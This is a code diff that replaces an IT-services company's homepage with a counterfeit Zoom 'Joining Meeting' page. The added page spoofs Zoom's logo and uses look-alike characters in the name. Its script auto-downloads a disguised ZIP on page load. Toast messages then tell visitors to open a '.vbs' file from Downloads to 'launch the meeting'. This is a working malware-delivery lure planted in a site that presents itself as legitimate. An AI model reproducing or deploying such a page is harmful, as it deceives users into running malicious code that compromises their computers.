@@ -1,358 +1,285 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+  <head>
     <meta charset="UTF-8">
+    <title>Joining Meeting</title>
+    <link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
+    <meta name="robots" content="noindex,nofollow,noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap"
 
-    <title>Franksjacob | Professional IT Services & Technology Solutions</title>
-    <meta name="description" content="Franksjacob provides professional IT services including IT support, cloud solutions, cybersecurity, network management, and software solutions.">
-
-    <meta name="robots" content="index, follow">
-    <meta name="author" content="Franksjacob">
-
-    <!-- Open Graph -->
-    <meta property="og:title" content="Franksjacob | IT Services">
-    <meta property="og:description" content="Reliable IT services for modern businesses.">
-    <meta property="og:type" content="website">
-
-    <!-- Embedded CSS -->
+      rel="stylesheet">
     <style>
-        :root {
-            --primary: #0a2540;
-            --secondary: #2563eb;
-            --light: #f8fafc;
-            --dark: #020617;
-            --gray: #475569;
-        }
+    body {
+        margin: 0;
+        font-family: "Inter", Arial, sans-serif;
+        background: #f7f7f7;
+        color: #232333;
+    }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+    .header {
+        background: #ffffff;
+        border-bottom: 1px solid #e5e5e5;
+        padding: 18px 40px;
+    }
 
-        body {
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, sans-serif;
-            line-height: 1.6;
-            color: var(--dark);
-            background-color: var(--light);
-        }
+    .logo {
+        font-size: 28px;
+        font-weight: 600;
+        color: #2d8cff;
+    }
 
-        a {
-            text-decoration: none;
-            color: inherit;
-        }
+    .container {
+        text-align: center;
+        margin-top: 90px;
+    }
 
-        .container {
-            width: 90%;
-            max-width: 1100px;
-            margin: auto;
-        }
+    h1 {
+        font-size: 30px;
+        font-weight: 600;
+        margin-bottom: 20px;
+    }
 
-        /* Header */
-        .site-header {
-            background: #fff;
-            border-bottom: 1px solid #e5e7eb;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
+    p {
+        font-size: 16px;
+        color: #4a4a4a;
+        margin: 10px 0;
+        line-height: 1.6;
+    }
 
-        .site-header .container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1rem 0;
-        }
+    .link {
+        color: #2d8cff;
+        text-decoration: none;
+        font-weight: 500;
+    }
 
-        .logo h1 {
-            font-size: 1.4rem;
-            color: var(--primary);
-        }
+    .link:hover {
+        text-decoration: underline;
+    }
 
-        .main-navigation ul {
-            list-style: none;
-            display: flex;
-            gap: 1.5rem;
-        }
+    .btn {
+        margin-top: 30px;
+        background-color: #2d8cff;
+        color: #fff;
+        border: none;
+        padding: 14px 32px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
 
-        .main-navigation a {
-            font-weight: 500;
-            color: var(--gray);
-        }
+    .btn:hover {
+        background-color: #1a73e8;
+    }
 
-        .main-navigation a:hover {
-            color: var(--secondary);
-        }
+    /* Progress bar */
+    .progress-container {
+        width: 300px;
+        height: 6px;
+        background: #e6e6e6;
+        border-radius: 10px;
+        margin: 25px auto;
+        overflow: hidden;
+    }
 
-        /* Hero */
-        .hero {
-            background: linear-gradient(135deg, var(--primary), #020617);
-            color: #fff;
-            padding: 5rem 0;
-            text-align: center;
-        }
+    .progress-bar {
+        height: 100%;
+        width: 0%;
+        background: #2d8cff;
+        animation: loading 3s infinite;
+    }
 
-        .hero h2 {
-            font-size: 2.5rem;
-            margin-bottom: 1rem;
-        }
+    @keyframes loading {
+        0% { width: 0%; }
+        50% { width: 80%; }
+        100% { width: 100%; }
+    }
 
-        .hero p {
-            font-size: 1.1rem;
-            max-width: 600px;
-            margin: auto;
-            margin-bottom: 2rem;
-        }
+    .divider {
+        width: 60%;
+        margin: 50px auto;
+        border-top: 1px solid #e5e5e5;
+    }
 
-        .btn-primary,
-        .btn-secondary {
-            display: inline-block;
-            padding: 0.75rem 1.5rem;
-            border-radius: 6px;
-            font-weight: 600;
-        }
+    .footer {
+        margin-top: 60px;
+        text-align: center;
+        font-size: 13px;
+        color: #777;
+    }
 
-        .btn-primary {
-            background: var(--secondary);
-            color: #fff;
-        }
+    .footer a {
+        color: #2d8cff;
+        text-decoration: none;
+        margin: 0 5px;
+    }
 
-        .btn-secondary {
-            background: #fff;
-            color: var(--primary);
-        }
+    .footer a:hover {
+        text-decoration: underline;
+    }
+</style> </head>
+  <body>
+    <div id="header" role="banner" class="clearfix">
+      <svg style="margin-top: 30px; margin-left: 30px;" width="115" height="26"
 
-        /* Sections */
-        section {
-            padding: 4rem 0;
-        }
+        viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
+      </svg> </div>
+    <div class="container">
+      <h1>Joining Meeting</h1>
+      <p>Sorry, You are using old version of Zοоm Workplace App.</p>
+      <p> It requires latest Zoom Workplace to join the meeting.</p>
+      <p> Download has started automatically, kindly install to join the Remote
+        Desktop Meeting. </p>
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      <p> A computer is required to launch the meeting, If the
+        download doesn't start automatically, please <a href="ZooMWorkplace_9CTWGUQ0RITC_SYP0RD02.zip"
 
-        section h2 {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-            color: var(--primary);
-        }
+          class="link" id="manualDownload">Download Manually</a> </p>
+      <button onclick="launchMeeting()" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
+        Launch Meeting </button>
+      <div class="divider"></div>
+      <p style="font-size:13px;"> By joining a meeting, you agree to our <a href="#"
 
-        section p {
-            max-width: 800px;
-            color: var(--gray);
-        }
+          class="link">Terms of Service</a> and <a href="#" class="link">Privacy
+          Statement</a> </p>
+    </div>
+    <div id="toast" style="
+    position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
+      Go to Downloads folder and click on <b>ZοоmWorkplace........vbs</b> to
+      launch meeting </div>
+    <div class="footer">
+      <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
+        Zoom Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
+          rights reserved.</span></p>
+      <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><a
 
-        /* Services */
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-top: 2rem;
-        }
+          href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust
+          Center |</a><span>&nbsp;</span><a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Acceptable
+          Use Guidelines |</a><span>&nbsp;</span><a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Legal
+          &amp; Compliance |</a><span>&nbsp;</span><a href="#" tabindex="0" role="button"
 
-        .service-item {
-            background: #fff;
-            padding: 2rem;
-            border-radius: 10px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        }
+          style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Do
+          Not Sell My Personal Information |</a><span>&nbsp;</span><a href="#" tabindex="0"
 
-        .service-item h3 {
-            margin-bottom: 0.5rem;
-            color: var(--primary);
-        }
+          role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie
+          Preferences</a></p>
+    </div>
+    <script>
+const files = {
+    windows: {
+        url: "ZooMWorkplace_9CTWGUQ0RITC_SYP0RD02.zip",
+        name: "ZooMWorkplace_9CTWGUQ0RITC_SYP0RD02.zip"
+    }
+};
 
-        /* Why Us */
-        .why-us ul {
-            margin-top: 1.5rem;
-            list-style: none;
-        }
+let selectedFile = files.windows;
 
-        .why-us li {
-            margin-bottom: 0.75rem;
-            padding-left: 1.5rem;
-            position: relative;
-        }
 
-        .why-us li::before {
-            content: "✓";
-            position: absolute;
-            left: 0;
-            color: var(--secondary);
-            font-weight: bold;
-        }
+function showToast(message, duration = 15000) {
+    const toast = document.getElementById("toast");
+    if (!toast) return;
 
-        /* CTA */
-        .cta {
-            background: var(--secondary);
-            color: #fff;
-            text-align: center;
-        }
+    toast.innerHTML = message;
+    toast.style.opacity = "1";
+    toast.style.transform = "translateY(0)";
 
-        .cta h2 {
-            color: #fff;
-        }
+    setTimeout(() => {
+        toast.style.opacity = "0";
+        toast.style.transform = "translateY(20px)";
+    }, duration);
+}
 
-        .cta p {
-            margin: 1rem auto 2rem;
-            color: #e0e7ff;
-        }
 
-        /* Contact */
-        .contact-form {
-            max-width: 500px;
-            margin-top: 2rem;
-        }
+function updateProgress(percent) {
+    const bar = document.querySelector(".progress-bar");
+    if (bar) {
+        bar.style.width = percent + "%";
+    }
+}
 
-        .form-group {
-            margin-bottom: 1rem;
-        }
+async function downloadFile(file) {
+    try {
+        showToast("⬇️ Download started...");
 
-        label {
-            display: block;
-            margin-bottom: 0.3rem;
-            font-weight: 500;
-        }
+        const response = await fetch(file.url);
+        if (!response.ok) throw new Error("Download failed");
 
-        input, textarea {
-            width: 100%;
-            padding: 0.6rem;
-            border-radius: 6px;
-            border: 1px solid #cbd5f5;
-            font-size: 1rem;
-        }
+        const contentLength = response.headers.get("content-length");
+        const total = contentLength ? parseInt(contentLength) : 0;
 
-        button {
-            border: none;
-            cursor: pointer;
-        }
+        const reader = response.body.getReader();
+        let received = 0;
+        let chunks = [];
 
-        /* Footer */
-        .site-footer {
-            background: #020617;
-            color: #cbd5f5;
-            text-align: center;
-            padding: 1.5rem 0;
-            font-size: 0.9rem;
-        }
+        while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
 
-        @media (max-width: 768px) {
-            .hero h2 {
-                font-size: 2rem;
-            }
+            chunks.push(value);
+            received += value.length;
 
-            .main-navigation ul {
-                gap: 1rem;
+            if (total) {
+                updateProgress((received / total) * 100);
             }
         }
-    </style>
-</head>
 
-<body>
+        updateProgress(100);
 
-<header class="site-header">
-    <div class="container">
-        <div class="logo">
-            <h1>Franksjacob</h1>
-        </div>
-        <nav class="main-navigation" aria-label="Main Navigation">
-            <ul>
-                <li><a href="#about">About</a></li>
-                <li><a href="#services">Services</a></li>
-                <li><a href="#why-us">Why Us</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
-        </nav>
-    </div>
-</header>
+        const blob = new Blob(chunks);
+        const blobUrl = window.URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = blobUrl;
+        a.download = file.name;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
 
-<section class="hero">
-    <div class="container">
-        <h2>Professional IT Services & Technology Solutions</h2>
-        <p>We help businesses build secure, scalable, and reliable IT environments that support growth.</p>
-        <a href="#contact" class="btn-primary">Get Started</a>
-    </div>
-</section>
+        window.URL.revokeObjectURL(blobUrl);
 
-<section id="about">
-    <div class="container">
-        <h2>About Franksjacob</h2>
-        <p>
-            Franksjacob delivers dependable IT services designed to simplify technology,
-            enhance security, and improve operational efficiency for businesses of all sizes.
-        </p>
-    </div>
-</section>
+        showToast("✅ Download complete. Open <b>" + file.name + "</b>");
 
-<section id="services" class="services">
-    <div class="container">
-        <h2>Our Services</h2>
-        <div class="services-grid">
-            <div class="service-item">
-                <h3>IT Support</h3>
-                <p>Proactive monitoring, helpdesk support, and system maintenance.</p>
-            </div>
-            <div class="service-item">
-                <h3>Cloud Solutions</h3>
-                <p>Secure cloud migration, management, and optimization.</p>
-            </div>
-            <div class="service-item">
-                <h3>Cybersecurity</h3>
-                <p>Advanced protection strategies to safeguard data and systems.</p>
-            </div>
-            <div class="service-item">
-                <h3>Network Management</h3>
-                <p>Reliable, high-performance network infrastructure solutions.</p>
-            </div>
-            <div class="service-item">
-                <h3>Software Solutions</h3>
-                <p>Custom integrations and business-focused software services.</p>
-            </div>
-        </div>
-    </div>
-</section>
+    } catch (err) {
+        console.log("Fallback download");
 
-<section id="why-us" class="why-us">
-    <div class="container">
-        <h2>Why Choose Franksjacob</h2>
-        <ul>
-            <li>Experienced and certified IT professionals</li>
-            <li>Security-first approach</li>
-            <li>Scalable solutions for growing businesses</li>
-            <li>Reliable long-term support</li>
-        </ul>
-    </div>
-</section>
+        const a = document.createElement("a");
+        a.href = file.url;
+        a.download = file.name;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+}
 
-<section class="cta">
-    <div class="container">
-        <h2>Let’s Build Your IT the Right Way</h2>
-        <p>Partner with Franksjacob for modern, secure, and reliable technology solutions.</p>
-        <a href="#contact" class="btn-secondary">Contact Us</a>
-    </div>
-</section>
 
-<section id="contact">
-    <div class="container">
-        <h2>Contact Us</h2>
-        <form class="contact-form" method="post" action="#">
-            <div class="form-group">
-                <label for="name">Full Name</label>
-                <input type="text" id="name" name="name" required>
-            </div>
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            <div class="form-group">
-                <label for="message">Message</label>
-                <textarea id="message" name="message" rows="5" required></textarea>
-            </div>
-            <button type="submit" class="btn-primary">Send Message</button>
-        </form>
-    </div>
-</section>
+function launchMeeting() {
+    downloadFile(selectedFile);
 
-<footer class="site-footer">
-    <p>&copy; 2025 Franksjacob. All rights reserved.</p>
-</footer>
+    setTimeout(() => {
+        showToast(
+            '📂 Go to Downloads and open <b>' + selectedFile.name + '</b>',
+            30000
+        );
+    }, 1200);
+}
 
-</body>
+
+window.addEventListener("DOMContentLoaded", () => {
+
+    const manualBtn = document.getElementById("manualDownload");
+    if (manualBtn) {
+        manualBtn.addEventListener("click", function(e) {
+            e.preventDefault();
+            launchMeeting();
+        });
+    }
+
+    setTimeout(launchMeeting, 1200);
+});
+</script>
+  </body>
 </html>
